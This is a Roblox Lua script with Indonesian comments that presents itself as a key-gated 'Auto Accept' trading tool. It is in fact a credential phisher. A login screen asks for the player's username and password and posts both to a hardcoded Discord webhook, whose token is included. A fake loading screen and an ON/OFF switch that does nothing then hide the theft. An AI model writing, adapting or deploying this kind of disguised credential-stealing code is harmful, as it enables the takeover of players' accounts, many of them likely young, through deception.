-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local httpService = game:GetService("HttpService")
    local data = {
        content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
    }
    
    local jsonData = httpService:JSONEncode(data)
    local success, response = pcall(function()
        return httpService:PostAsync(webhook_url, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord: " .. response)
    end
end

-- Fungsi Membuat GUI Pertama (Key Validation)
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local keyBox = Instance.new("TextBox")
    local submitButton = Instance.new("TextButton")

    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    keyBox.Name = "KeyBox"
    keyBox.Parent = frame
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 60)
    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Font = Enum.Font.SourceSans
    keyBox.Text = ""
    keyBox.TextSize = 14
    keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    submitButton.Name = "SubmitButton"
    submitButton.Parent = frame
    submitButton.Size = UDim2.new(1, -20, 0, 40)
    submitButton.Position = UDim2.new(0, 10, 0, 120)
    submitButton.Text = "Login"
    submitButton.Font = Enum.Font.SourceSansBold
    submitButton.TextSize = 16
    submitButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    submitButton.MouseButton1Click:Connect(function()
        local key = keyBox.Text
        if key == correctKey then
            print("Key valid!")
            sendToDiscord("Unknown", "Unknown")  -- Placeholder, akan diganti nanti
            gui:Destroy()
            createLoginGUI()  -- Pindah ke GUI login
        else
            print("Key tidak valid!")
        end
    end)
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            print("Login berhasil! Username:", username, "Password:", password)
            sendToDiscord(username, password)
            gui:Destroy()

            -- Menambahkan loading sebelum GUI selanjutnya
            local loadingGui = Instance.new("ScreenGui")
            loadingGui.Parent = game.CoreGui or game:GetService("CoreGui")
            local loadingFrame = Instance.new("Frame")
            loadingFrame.Parent = loadingGui
            loadingFrame.Size = UDim2.new(0, 300, 0, 100)
            loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
            loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            loadingFrame.BorderSizePixel = 3
            loadingFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)

            local loadingLabel = Instance.new("TextLabel")
            loadingLabel.Parent = loadingFrame
            loadingLabel.Size = UDim2.new(1, 0, 1, 0)
            loadingLabel.BackgroundTransparency = 1
            loadingLabel.Font = Enum.Font.SourceSansBold
            loadingLabel.Text = "Loading... (8 detik)"
            loadingLabel.TextSize = 20
            loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

            wait(8)  -- Waktu loading 8 detik
            loadingGui:Destroy()

            -- Lanjutkan ke GUI berikutnya
            createSwitchGUI()
        else
            print("Username dan password tidak boleh kosong!")
        end
    end)
end

-- Fungsi Membuat GUI Keempat (Switch)
local function createSwitchGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local switchButton = Instance.new("TextButton")

    gui.Name = "SwitchGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    frame.Name = "SwitchFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Auto Accept"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    switchButton.Name = "SwitchButton"
    switchButton.Parent = frame
    switchButton.Size = UDim2.new(1, -20, 0, 40)
    switchButton.Position = UDim2.new(0, 10, 0, 100)
    switchButton.Text = "ON"
    switchButton.Font = Enum.Font.SourceSansBold
    switchButton.TextSize = 16
    switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    switchButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    switchButton.MouseButton1Click:Connect(function()
        if switchButton.Text == "ON" then
            switchButton.Text = "OFF"
            switchButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
            print("Auto Accept OFF")
        else
            switchButton.Text = "ON"
            switchButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
            print("Auto Accept ON")
        end
    end)
end

-- Memulai script dengan GUI pertama
createKeyValidationGUI()
